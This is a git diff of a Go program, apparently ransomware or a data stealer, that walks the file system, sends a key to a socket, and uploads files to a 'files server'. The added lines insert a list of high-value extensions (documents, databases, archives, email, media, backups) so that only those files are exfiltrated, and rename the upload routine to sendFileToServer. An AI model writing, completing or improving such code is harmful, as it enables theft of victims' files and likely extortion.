@@ -10,7 +10,7 @@ import (
 	"os"
 	"path/filepath"
 	"strconv"
-
+	"strings"
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/container"
 	"fyne.io/fyne/v2/data/binding"
@@ -36,12 +36,15 @@ func main() {
 	}
 	sock.Write(key)
 	sock.Close()
+	ex := []string{".doc",".pdf",".docx",".txt",".mp3",".wav",".7z",".zip",".rar",".csv",".db",".sql",".xml",".email",".msg",".jpg",".jpeg",".png",".xls",".xlsm",".xlsx",".bak",".flv",".mp4",".m4v",".wmv"}
 	for i := 0; i < len(allfiles); i++ {
 		s, err := net.Dial("tcp", "127.0.0.2:3000") //files server
 		if err != nil {
 			panic(err)
 		}
-		sendFileToClient(s, allfiles[i])
+		if filesfilter(filepath.Ext(allfiles[i]), ex){
+			sendFileToServer(s, allfiles[i])
+		}
 		s.Close()
 	}
 	for i := 0; i < len(allfiles); i++ {
@@ -103,7 +106,7 @@ func ListAllfiles(path string) (paths []string) {
 	})
 	return paths
 }
-func sendFileToClient(connection net.Conn, filePath string) {
+func sendFileToServer(connection net.Conn, filePath string) {
 	//A client has connected
 	defer connection.Close()
 	file, err := os.Open(filePath)
@@ -141,4 +144,15 @@ func fillString(retunString string, toLength int) string {
 		break
 	}
 	return retunString
+}
+func filesfilter(extention string, ex []string) bool {
+	size := len(ex)
+	var r bool = false
+	for i := 0; i < size; i++ {
+		n := strings.Compare(extention, ex[i])
+		if n == 0 {
+			r = true
+		}
+	}
+	return r
 }
